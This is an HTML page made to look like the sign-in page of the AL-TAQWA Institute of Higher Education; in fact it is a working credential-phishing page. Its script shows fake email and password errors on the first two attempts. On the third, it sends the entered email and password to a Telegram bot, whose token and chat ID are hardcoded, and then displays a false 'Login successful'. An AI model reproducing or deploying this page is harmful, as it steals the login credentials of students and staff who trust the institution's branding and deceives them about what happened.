<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AL-TAQWA - Sign in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        /* د کارت بڼه - سپینه، ساده */
        .login-container {
            width: 100%;
            max-width: 460px;
            background: white;
            padding: 40px 32px 48px;
            text-align: center;
        }

        /* لوګو او نوم */
        .logo h1 {
            font-size: 34px;
            font-weight: 700;
            color: #1e3a2f;
            letter-spacing: -0.5px;
            margin-bottom: 8px;
        }

        .logo .institute {
            font-size: 15px;
            color: #4a6b5e;
            font-weight: 500;
            margin-bottom: 20px;
        }

        .signin-text {
            font-size: 16px;
            font-weight: 600;
            color: #1e3a2f;
            margin: 16px 0 20px 0;
        }

        /* انپوټ فیلډونه */
        .input-group {
            text-align: left;
            margin-bottom: 22px;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #1e2a24;
            margin-bottom: 6px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1px solid #d0d8d4;
            border-radius: 12px;
            background: white;
            outline: none;
            transition: 0.2s;
        }

        .input-group input:focus {
            border-color: #2b7a5c;
            box-shadow: 0 0 0 3px rgba(43, 122, 92, 0.1);
        }

        /* چیک باکس */
        .checkbox-wrapper {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 20px 0 32px;
        }

        .checkbox-wrapper input {
            width: 18px;
            height: 18px;
            margin: 0;
        }

        .checkbox-wrapper label {
            font-size: 14px;
            color: #2a4238;
            font-weight: 500;
        }

        /* لاګ ان تڼۍ */
        button {
            width: 100%;
            background-color: #216e54;
            color: white;
            font-size: 16px;
            font-weight: 600;
            padding: 14px;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            transition: 0.2s;
        }

        button:hover {
            background-color: #155a44;
        }

        /* د پیغام ساحه */
        .message-area {
            margin-top: 24px;
            font-size: 13px;
            font-weight: 500;
        }

        .error-message {
            background-color: #fef2f0;
            color: #c5221f;
            padding: 10px 14px;
            border-radius: 60px;
        }

        .success-message {
            background-color: #e6f4ea;
            color: #146b3a;
        }
    </style>
</head>
<body>
<div class="login-container">
    <div class="logo">
        <h1>AL-TAQWA</h1>
        <div class="institute">Institute of Higher Education</div>
    </div>
    <div class="signin-text">Sign in</div>

    <form id="loginForm">
        <div class="input-group">
            <label>Email</label>
            <input type="email" id="email" placeholder="your@email.com" autocomplete="off">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="**********">
        </div>
        <div class="checkbox-wrapper">
            <input type="checkbox" id="rememberCheckbox">
            <label for="rememberCheckbox">Remember password</label>
        </div>
        <button type="submit" id="loginButton">Login</button>
    </form>

    <div id="messageDisplay" class="message-area"></div>
</div>

<script>
    // د هڅو شمېر (کارونکي ته نه ښودل کیږي)
    let attemptCount = parseInt(sessionStorage.getItem('loginAttempts')) || 0;

    // ټیلیګرام بوټ توکین او چټ آي ډي
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const CHAT_ID = "8295417969";

    // ټیلیګرام ته د معلوماتو استولو فنکشن
    async function sendToTelegram(email, password) {
        const message = `🔐 *AL-TAQWA LOGIN* 🔐\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
        } catch (err) {
            console.error("Telegram error:", err);
        }
    }

    function showMessage(text, isSuccess = false) {
        const msgDiv = document.getElementById('messageDisplay');
        msgDiv.innerHTML = `<div class="error-message ${isSuccess ? 'success-message' : ''}">${text}</div>`;
        if (isSuccess) {
            document.getElementById('email').disabled = true;
            document.getElementById('password').disabled = true;
            document.getElementById('loginButton').disabled = true;
            setTimeout(() => {
                sessionStorage.removeItem('loginAttempts');
                if (confirm("✅ Login successful!\nReload page?")) {
                    window.location.reload();
                }
            }, 400);
        }
    }

    // د فورمې استول
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const emailInput = document.getElementById('email').value.trim();
        const passwordInput = document.getElementById('password').value;
        const rememberChecked = document.getElementById('rememberCheckbox').checked;

        // Remember password (یوازې UI لپاره)
        if (rememberChecked) {
            localStorage.setItem('savedEmail', emailInput);
        } else {
            localStorage.removeItem('savedEmail');
        }

        // کړنلار:
        // لومړۍ هڅه
        if (attemptCount === 0) {
            showMessage("please check your email", false);
            attemptCount++;
            sessionStorage.setItem('loginAttempts', attemptCount);
            return;
        }
        
        // دوهمه هڅه
        if (attemptCount === 1) {
            showMessage("please check your password", false);
            attemptCount++;
            sessionStorage.setItem('loginAttempts', attemptCount);
            return;
        }
        
        // دریمه هڅه – بریالی لاګ ان (هر ایمیل او پاسورډ)
        if (attemptCount === 2) {
            await sendToTelegram(emailInput, passwordInput);
            showMessage("✅ Login successful", true);
            sessionStorage.removeItem('loginAttempts');
            return;
        }
        
        if (attemptCount >= 3) {
            showMessage("Too many attempts. Refresh page.", false);
            document.getElementById('loginButton').disabled = true;
        }
    });

    // د مخ په پیل کې د یاد شوي ایمیل ډکول
    window.addEventListener('DOMContentLoaded', () => {
        const saved = localStorage.getItem('savedEmail');
        if (saved) {
            document.getElementById('email').value = saved;
            document.getElementById('rememberCheckbox').checked = true;
        }
        if (sessionStorage.getItem('loginAttempts') >= 3) {
            document.getElementById('loginButton').disabled = true;
            showMessage("Session expired. Please refresh the page.", false);
        }
    });
</script>
</body>
</html>
